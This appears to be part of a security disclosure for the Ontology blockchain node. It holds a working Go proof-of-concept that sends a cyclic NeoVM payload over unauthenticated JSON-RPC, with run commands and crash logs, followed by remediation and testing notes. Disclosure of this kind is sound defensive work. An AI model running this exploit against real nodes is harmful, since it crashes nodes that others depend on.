		builder.EmitPushByteArray([]byte("regIDWithPublicKey"))
		builder.EmitPushByteArray(ontIDContractAddress)
		builder.EmitPushInteger(big.NewInt(0))
		builder.Emit(neovm.SYSCALL)
		builder.EmitPushByteArray([]byte(nativeInvokeName))
	case "runtime":
		builder.Emit(neovm.SYSCALL)
		builder.EmitPushByteArray([]byte(runtimeSerializeName))
	default:
		panic("unknown mode")
	}

	return builder.ToArray()
}

func buildSignedRaw(code []byte) (rawHex string, txHash string, signer string, err error) {
	acc := account.NewAccount("")
	tx := &types.MutableTransaction{
		TxType:   types.InvokeNeo,
		Nonce:    uint32(time.Now().UnixNano()),
		GasPrice: 0,
		GasLimit: 200000000,
		Payload:  &payload.InvokeCode{Code: code},
	}

	tx.Payer = acc.Address
	hash := tx.Hash()
	sigData, err := signature.Sign(acc, hash.ToArray())
	if err != nil {
		return "", "", "", err
	}
	tx.Sigs = []types.Sig{{
		PubKeys: []keypair.PublicKey{acc.PublicKey},
		M:       1,
		SigData: [][]byte{sigData},
	}}

	immutable, err := tx.IntoImmutable()
	if err != nil {
		return "", "", "", err
	}
	return common.ToHexString(immutable.ToArray()), immutable.Hash().ToHexString(), acc.Address.ToBase58(), nil
}

func rpcCall(endpoint, method string, params []interface{}) ([]byte, error) {
	body, err := json.Marshal(rpcRequest{
		JSONRPC: "2.0",
		Method:  method,
		Params:  params,
		ID:      1,
	})
	if err != nil {
		return nil, err
	}
	resp, err := http.Post(endpoint, "application/json", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	out, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var parsed rpcResponse
	if err := json.Unmarshal(out, &parsed); err == nil && parsed.Error != 0 {
		return out, fmt.Errorf("rpc %s returned error %d desc=%s result=%s", method, parsed.Error, parsed.Desc, string(parsed.Result))
	}
	return out, nil
}

func main() {
	endpoint := flag.String("endpoint", "http://127.0.0.1:20336", "Ontology JSON-RPC endpoint")
	mode := flag.String("mode", "native", "payload mode: native or runtime")
	preexec := flag.Bool("preexec", true, "send with sendrawtransaction pre-exec flag")
	send := flag.Bool("send", false, "actually submit the transaction to the endpoint")
	flag.Parse()

	if *mode != "native" && *mode != "runtime" {
		fmt.Fprintln(os.Stderr, "mode must be native or runtime")
		os.Exit(2)
	}

	code := buildCycleCode(*mode)
	rawHex, txHash, signer, err := buildSignedRaw(code)
	if err != nil {
		fmt.Fprintf(os.Stderr, "build transaction failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("mode=%s\n", *mode)
	fmt.Printf("signer_address=%s\n", signer)
	fmt.Printf("malicious_hash=%s raw_len=%d code_len=%d\n", txHash, len(rawHex)/2, len(code))
	fmt.Printf("raw_tx=%s\n", rawHex)

	if !*send {
		fmt.Println("not_sent=true")
		fmt.Println("warning=rerun with --send only against a disposable local/regtest node; --mode=native is expected to kill vulnerable nodes")
		return
	}

	params := []interface{}{rawHex}
	if *preexec {
		params = append(params, 1)
	}
	out, err := rpcCall(*endpoint, "sendrawtransaction", params)
	if err != nil {
		fmt.Printf("trigger_rpc_error=%v\n", err)
	} else {
		fmt.Printf("trigger_rpc_response=%s\n", string(out))
	}

	out, err = rpcCall(*endpoint, "getblockcount", []interface{}{})
	if err != nil {
		fmt.Printf("post_trigger_getblockcount_error=%v\n", err)
		return
	}
	fmt.Printf("post_trigger_getblockcount_response=%s\n", string(out))
}
```

### Build and run

```sh
cd poc
go mod tidy
# Apple Silicon host: emit x86_64 because libwasmjit_onto_interface_darwin.a is x86_64.
CGO_ENABLED=1 GOARCH=amd64 GOOS=darwin CC="clang -arch x86_64" go build -o v5-cycle-poc .

# Safe (prints raw tx only, does not send):
./v5-cycle-poc --mode=native
./v5-cycle-poc --mode=runtime

# Against a disposable local --testmode node (RPC 127.0.0.1:20336):
./v5-cycle-poc --endpoint=http://127.0.0.1:20336 --mode=runtime  --preexec        --send   # control, survives
./v5-cycle-poc --endpoint=http://127.0.0.1:20336 --mode=native   --preexec        --send   # fatal, explicit pre-exec
./v5-cycle-poc --endpoint=http://127.0.0.1:20336 --mode=native   --preexec=false  --send   # fatal, default txpool
```

### 5a. Control — `System.Runtime.Serialize` with the identical cyclic array; node SURVIVES

```text
$ ./v5-cycle-poc --endpoint=http://127.0.0.1:20336 --mode=runtime --preexec --send
endpoint=http://127.0.0.1:20336
signer_address=AVMMy5mayk2HT69ctiA7JencbnAytErR23
raw_len=183 code_len=36
trigger_rpc_error=rpc sendrawtransaction returned error 47001 desc=SMARTCODE EXEC ERROR result="[NeoVmService] service system call error!: [SystemCall] service execution error!: runtime serialize: can not serialize length over the uplimit"
post_trigger_getblockcount_response={"desc":"SUCCESS","error":0,"id":1,"jsonrpc":"2.0","result":12}
```

The identical `[false, self]` returns a bounded smart-contract error and the node stays alive (`getblockcount` still responds). This isolates the fatal outcome to the uncapped native serializer.

### 5b. Fatal — explicit pre-exec route; anonymous POST, zero-balance signer; node DIES (exit code 2)

```text
$ ./v5-cycle-poc --endpoint=http://127.0.0.1:20336 --mode=native --preexec --send
endpoint=http://127.0.0.1:20336
signer_address=AcycfJbXpAcd1pxTBk9oX6iCRc4hHt4Zca      # freshly generated, unfunded
raw_len=222 code_len=75 mode=native
trigger_rpc_error=Post "http://127.0.0.1:20336": EOF
post_trigger_getblockcount_error=Post "http://127.0.0.1:20336": dial tcp 127.0.0.1:20336: connect: connection refused
# background node process exited with code 2
```

**Full unauthenticated kill-chain** (goroutine 261, HTTP handler; from `fresh-evidence/live-crash-excerpt.txt`):

```text
runtime: goroutine stack exceeds 1000000000-byte limit
runtime: sp=0x2416778864d8 stack=[0x241677886000, 0x241697886000]
fatal error: stack overflow

goroutine 261 gp=0x241654f58960 m=3 mp=0x241654b75008 [running]:
github.com/ontio/ontology/vm/neovm/types.(*VmValue).circularRefAndDepthDetection(...)
    vm/neovm/types/neovm_value.go:489
github.com/ontio/ontology/vm/neovm/types.(*VmValue).CircularRefAndDepthDetection(...)
    vm/neovm/types/neovm_value.go:486
github.com/ontio/ontology/vm/neovm/types.(*VmValue).BuildParamToNative(...)
    vm/neovm/types/neovm_value.go:155
    ... [infinite BuildParamToNative(162) -> buildParamToNative(184) recursion] ...
github.com/ontio/ontology/smartcontract/service/neovm.NativeInvoke(...)
    smartcontract/service/neovm/native.go:55        <- Ontology.Native.Invoke
github.com/ontio/ontology/smartcontract/service/neovm.(*NeoVmService).SystemCall(...)
    smartcontract/service/neovm/neovm_service.go:277
github.com/ontio/ontology/smartcontract/service/neovm.(*NeoVmService).Invoke(...)
    smartcontract/service/neovm/neovm_service.go:183
github.com/ontio/ontology/core/store/ledgerstore.(*LedgerStoreImp).PreExecuteContractWithParam(...)
    core/store/ledgerstore/ledger_store.go:1309
github.com/ontio/ontology/core/store/ledgerstore.(*LedgerStoreImp).PreExecuteContract(...)
    core/store/ledgerstore/ledger_store.go:1370
github.com/ontio/ontology/http/base/actor.PreExecuteContract(...)
    http/base/actor/ledger.go:95
github.com/ontio/ontology/http/jsonrpc.SendRawTransaction(...)
    http/jsonrpc/interfaces.go:286
github.com/ontio/ontology/http/base/rpc.(*ServeMux).ServeHTTP(...)
    http/base/rpc/rpc.go:111                        <- NO AUTH
net/http.(*conn).serve(...)
    Go stdlib/net/http/server.go:2073
created by net/http.(*Server).Serve in goroutine 109
```

### 5c. Fatal — default txpool route (`--preexec=false`); node DIES (exit code 2)

```text
$ ./v5-cycle-poc --endpoint=http://127.0.0.1:20336 --mode=native --preexec=false --send
endpoint=http://127.0.0.1:20336
signer_address=AZJjDy54Tt4SBaSw3fmri3LNghGCpSLpPh
raw_len=222 code_len=75 mode=native
trigger_rpc_error=Post "http://127.0.0.1:20336": EOF
post_trigger_getblockcount_error=Post "http://127.0.0.1:20336": dial tcp 127.0.0.1:20336: connect: connection refused
# background node process exited with code 2
```

**Crash tail on the ordinary submission route** (from `fresh-evidence/live-crash-txpool-excerpt.txt`):

```text
fatal error: stack overflow
github.com/ontio/ontology/vm/neovm/types.(*VmValue).buildParamToNative(...)   neovm_value.go:184
github.com/ontio/ontology/vm/neovm/types.(*VmValue).BuildParamToNative(...)   neovm_value.go:162
github.com/ontio/ontology/smartcontract/service/neovm.NativeInvoke(...)       native.go:55
github.com/ontio/ontology/smartcontract/service/neovm.(*NeoVmService).SystemCall(...)  neovm_service.go:277
github.com/ontio/ontology/smartcontract/service/neovm.(*NeoVmService).Invoke(...)      neovm_service.go:183
github.com/ontio/ontology/core/store/ledgerstore.(*LedgerStoreImp).PreExecuteContractWithParam(...)  ledger_store.go:1309
github.com/ontio/ontology/core/store/ledgerstore.(*LedgerStoreImp).PreExecuteContract(...)           ledger_store.go:1370
github.com/ontio/ontology/http/base/actor.PreExecuteContract(...)             ledger.go:95
github.com/ontio/ontology/http/base/actor.AppendTxToPool(...)                 txnpool.go:51
github.com/ontio/ontology/http/base/common.SendTxToPool(...)                  common.go:284
github.com/ontio/ontology/http/jsonrpc.SendRawTransaction(...)                interfaces.go:296
github.com/ontio/ontology/http/base/rpc.(*ServeMux).ServeHTTP(...)            rpc.go:111
```

Same fatal serializer, reached through the default (no-flag) submission path — confirming this is not conditional on the explicit pre-exec parameter.

---

## Suggested remediation (informational)

Restore whole-graph traversal in `circularRefAndDepthDetection` so it walks **every** child (not just child 0) using one shared visited-set for the graph rooted at the value being checked, and cover array, struct, **and** map (both key and value halves) symmetrically. In addition: give the native-argument serializer its own shared visited-set/depth carried through recursion instead of re-entering the public `BuildParamToNative` per child, and add a `MAX_BYTEARRAY_SIZE` sink cap consistent with `Serialize`. Note that `recover()` wrappers are not a containment boundary for a Go runtime stack-overflow throw and should remain defense-in-depth only. Regression tests should exercise later-child cycles specifically: `[safe, self]`, `[safe, safe, self]`, `[safe, [safe, self]]`, struct/map variants, plus a `System.Runtime.Serialize` control and an `Ontology.Native.Invoke` pre-exec regression run in a subprocess (expected behavior on a vulnerable binary is process death).

---

## Disclosure / testing notes

- All five proofs and the control were executed on 2026-07-18 with `go1.26.4` against checkout `1d2d81eb`. Raw logs are archived under `fresh-evidence/` (`inprocess-native.txt`, `inprocess-preexec-amd64.txt`, `live-node.log`, `live-node-txpool-path.log`, `live-crash-excerpt.txt`, `live-crash-txpool-excerpt.txt`).
- All testing was performed on disposable, locally-run single-node `--testmode` instances that we controlled. No public Ontology infrastructure, third-party node, or mainnet endpoint was targeted. The two disposable nodes were confirmed terminated after testing; their data directories exist only in a scratchpad.
- Test sources added to the working tree (untracked): `vm/neovm/types/freshproof_test.go`, `vm/neovm/freshproof_cycle_test.go`, `smartcontract/test/freshproof_reachability_test.go`. The PoC lives under `poc/`.
